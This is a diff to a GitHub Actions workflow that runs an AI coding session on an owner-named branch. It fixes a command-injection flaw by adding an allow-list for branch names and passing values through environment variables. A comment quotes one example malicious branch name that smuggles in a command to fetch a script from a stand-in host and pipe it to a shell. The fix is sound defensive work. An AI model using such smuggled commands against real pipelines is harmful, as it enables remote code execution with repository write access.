@@ -75,9 +75,27 @@ jobs:
             echo "instruct: refusing to work on '$TARGET'. The default branch is the owner's alone."
             exit 1
           fi
+          # **An allow-list, not a deny-list — the Keeper's KP2-06.**
+          #
+          # What stood here refused three shapes: `*/../*`, `*..*` and a leading
+          # `-`. Everything else went through, into three `git push` lines and a
+          # `node -e` string, unquoted. A branch named `x;curl evil.sh|sh` ran a
+          # shell command; a branch containing a double quote closed the JSON
+          # string and wrote whatever followed it into a script this workflow
+          # executes with a token that can write to the repository.
+          #
+          # Naming the dangerous characters is the wrong direction: the list is
+          # never finished, and the one nobody thought of is the one that gets
+          # used. So this permits what a branch name actually needs and refuses
+          # every other byte, including the space this repository's own branch
+          # names never contain.
           case "$TARGET" in
-            */../*|*..*|-*) echo "instruct: '$TARGET' is not a branch name this workflow accepts."; exit 1 ;;
+            ""|-*|/*|*/|*..*|*//*) echo "instruct: '$TARGET' is not a branch name this workflow accepts."; exit 1 ;;
           esac
+          if ! printf '%s' "$TARGET" | grep -qE '^[A-Za-z0-9][A-Za-z0-9._/-]{0,199}$'; then
+            echo "instruct: '$TARGET' contains something this workflow will not put in a command."
+            exit 1
+          fi
           echo "instruct: working on '$TARGET'."
 
       - uses: actions/checkout@v5
@@ -103,7 +121,7 @@ jobs:
         run: |
           node scripts/virgil-status.mjs \
             --holder fabricator --activity WORKING \
-            --note "Working on the owner's instruction. Run ${{ github.run_id }}."
+            --note "Working on the owner's instruction. Run $RUN_ID."
 
       # 3. **The instruction, written down before it is acted on.** Every change
       #    this workflow makes has a reason the owner can find, in his own words,
@@ -111,17 +129,25 @@ jobs:
       - name: Record the instruction
         env:
           INSTRUCTION: ${{ inputs.instruction }}
+          TARGET: ${{ inputs.branch }}
+          RUN_ID: ${{ github.run_id }}
         run: |
           mkdir -p .virgil/instructions
+          # Every value arrives through the environment. `INSTRUCTION` already
+          # did — it is the owner's own prose and was never trusted — while the
+          # branch beside it was pasted into the same string literal, which is
+          # the whole of KP2-06: one field was treated as data and the field next
+          # to it as code, in one JSON object.
           node -e '
             const fs = require("node:fs");
+            const runId = process.env.RUN_ID;
             fs.writeFileSync(
-              ".virgil/instructions/${{ github.run_id }}.json",
+              `.virgil/instructions/${runId}.json`,
               JSON.stringify(
                 {
-                  runId: "${{ github.run_id }}",
+                  runId,
                   at: new Date().toISOString(),
-                  branch: "${{ inputs.branch }}",
+                  branch: process.env.TARGET,
                   instruction: process.env.INSTRUCTION,
                 },
                 null,
@@ -131,15 +157,18 @@ jobs:
           '
 
       - name: Commit the instruction and the status
+        env:
+          TARGET: ${{ inputs.branch }}
+          RUN_ID: ${{ github.run_id }}
         run: |
           git config user.email "noreply@anthropic.com"
           git config user.name "Claude"
           git add .virgil
           git diff --staged --quiet || git commit -m "The owner's instruction, and a session picking it up
 
-          Run ${{ github.run_id }}. Written before the work rather than after it, so
+          Run $RUN_ID. Written before the work rather than after it, so
           that every change this run makes has a reason that can be found."
-          git push origin HEAD:${{ inputs.branch }}
+          git push origin "HEAD:$TARGET"
 
       # 4. **The agent.** It works under `CLAUDE.md` like any session here: one
       #    branch, no merge, no deploy, no other repository.
@@ -175,13 +204,16 @@ jobs:
 
       - name: Commit whatever the session changed
         if: always()
+        env:
+          TARGET: ${{ inputs.branch }}
+          RUN_ID: ${{ github.run_id }}
         run: |
           git add -A
-          git diff --staged --quiet || git commit -m "The session's work on run ${{ github.run_id }}
+          git diff --staged --quiet || git commit -m "The session's work on run $RUN_ID
 
           Made on the owner's instruction, recorded in
-          .virgil/instructions/${{ github.run_id }}.json."
-          git push origin HEAD:${{ inputs.branch }}
+          .virgil/instructions/$RUN_ID.json."
+          git push origin "HEAD:$TARGET"
 
       # 5. **And the room is told it stopped**, whatever happened — including
       #    when the step above failed. A run that ends leaving a Fabricator lit
@@ -189,11 +221,15 @@ jobs:
       #    the source rather than waiting twenty minutes for it to go cold.
       - name: Say that the session has stopped
         if: always()
+        env:
+          TARGET: ${{ inputs.branch }}
+          RUN_ID: ${{ github.run_id }}
+          STATUS: ${{ job.status }}
         run: |
           node scripts/virgil-status.mjs --idle \
-            --note "Run ${{ github.run_id }} finished with ${{ job.status }}. Nothing is in flight."
+            --note "Run $RUN_ID finished with $STATUS. Nothing is in flight."
           git add .virgil
           git diff --staged --quiet || git commit -m "The session stopped, and the room says so
 
-          Run ${{ github.run_id }}, ${{ job.status }}."
-          git push origin HEAD:${{ inputs.branch }}
+          Run $RUN_ID, $STATUS."
+          git push origin "HEAD:$TARGET"
